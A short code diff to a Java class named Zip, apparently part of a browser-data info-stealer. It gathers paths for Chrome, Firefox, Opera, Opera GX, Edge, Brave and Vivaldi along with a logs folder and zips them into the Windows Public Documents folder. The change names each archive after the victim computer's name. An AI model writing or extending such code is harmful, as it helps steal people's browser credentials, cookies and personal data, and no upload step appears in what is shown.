@@ -28,7 +28,7 @@ public class Zip {
 
         final List<String> srcFiles = Arrays.asList(chrome, firefox, opera, operagx, edge, brave, vivaldi, logs);
 
-        final FileOutputStream fos = new FileOutputStream("C:\\Users\\Public\\Documents\\logs.zip");
+        final FileOutputStream fos = new FileOutputStream("C:\\Users\\Public\\Documents\\" + System.getenv("COMPUTERNAME") + ".zip");
         ZipOutputStream zipOut = new ZipOutputStream(fos);
 
         for (String srcFile : srcFiles) {
